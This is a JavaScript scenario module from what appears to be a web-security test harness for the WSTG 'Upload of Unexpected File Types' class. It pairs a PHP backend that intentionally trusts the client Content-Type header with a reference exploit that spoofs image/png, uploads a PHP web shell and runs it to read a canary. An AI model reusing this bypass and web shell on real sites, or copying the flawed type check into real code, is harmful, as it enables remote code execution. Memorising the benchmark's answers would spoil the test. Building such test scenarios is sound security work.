// WSTG-BUSL-08 (4.10.8) — Upload of Unexpected File Types behaviour.
// Node front shows an image-upload UI and proxies /upload + /uploads/* to a real
// PHP backend. The backend's type check trusts the client Content-Type header,
// so spoofing image/png while uploading a .php bypasses it; php -S then executes
// the unexpected file (RCE) and dumps the canary.

import { Scenario } from './scenario.mjs'

const B = 'classes/wstg-file-upload-unexpected-4.10.8/backends'

export const classDef = {
  wstgId: 'WSTG-BUSL-08',
  class: 'Upload of Unexpected File Types',
  defenceTiers: [0],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  backend: {
    spec({ manifest }) {
      return {
        cmd: 'php',
        args: ['-S', '127.0.0.1:9001', `${B}/router.php`],
        port: 9001,
        env: { PR_BACKEND_PORT: '9001', PR_CANARY: manifest.perDeployCanary },
      }
    },
  },

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.endpoint.path ||
      reqUrl.pathname === '/upload' ||
      reqUrl.pathname.startsWith('/uploads/')
  },

  async handleRequest({ req, reqUrl, scenario, helpers, renderPage }) {
    if (reqUrl.pathname === scenario.endpoint.path && req.method === 'GET') {
      return { status: 200, body: renderPage(uploadUI(scenario)) }
    }
    const r = await helpers.proxyToBackend(req, reqUrl)
    return { status: r.status, headers: { 'Content-Type': 'text/html; charset=utf-8' }, body: r.body }
  },

  // Reference exploit: spoof Content-Type: image/png to bypass the type filter,
  // upload a PHP web shell, then request it to execute and read the canary.
  async fireExploit({ baseUrl }) {
    const name = 'pr_' + Math.random().toString(36).slice(2, 9) + '.php'
    await fetch(`${baseUrl}/upload?name=${encodeURIComponent(name)}`, {
      method: 'POST',
      headers: { 'Content-Type': 'image/png' }, // spoofed — bypasses the type filter
      body: '<?php echo getenv("PR_CANARY"); ?>',
      redirect: 'manual',
    })
    const r = await fetch(`${baseUrl}/uploads/${name}`, { redirect: 'manual' })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

function uploadUI(scenario) {
  return `<section style="max-width:560px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 8px">${escapeHtml(scenario.featureLabel)}</h2>
  <p style="color:#666;margin:0 0 12px">${escapeHtml(scenario.intro)}</p>
  <form method="POST" action="/upload" enctype="multipart/form-data" style="display:flex;flex-direction:column;gap:10px">
    <label>Choose a ${escapeHtml(scenario.imageNoun)} image (PNG/JPEG/GIF)<input type="file" name="file" accept="image/*" style="display:block;margin-top:6px"></label>
    <button type="submit" style="padding:9px 14px">Upload ${escapeHtml(scenario.imageNoun)}</button>
  </form>
  <p style="font-size:13px;color:#666;margin-top:12px">Only image uploads are accepted. Uploaded ${escapeHtml(scenario.imageNoun)}s are stored under <code>/uploads/</code> and served back directly.</p>
</section>`
}
function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
